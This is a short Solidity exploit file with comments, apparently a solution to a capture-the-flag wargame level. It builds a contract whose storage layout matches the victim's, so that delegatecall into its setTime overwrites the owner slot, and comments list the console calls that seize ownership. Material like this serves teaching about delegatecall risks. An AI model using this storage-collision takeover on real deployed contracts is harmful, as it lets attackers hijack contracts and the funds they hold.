// 1 - Deploy this contract - Remix
// 2 - await contract.setFirstTime(Pass deployed contract address) - Chrome Console
// 2 - await contract.setFirstTime(Pass player address) - Chrome Console

// As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky.
// This is particularly true for contract libraries that have their own state.
// This example demonstrates why the library keyword should be used for building libraries,
// as it prevents the libraries from storing and accessing state variables.

pragma solidity ^0.6.0;

contract LibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = address(_time);
    }
}
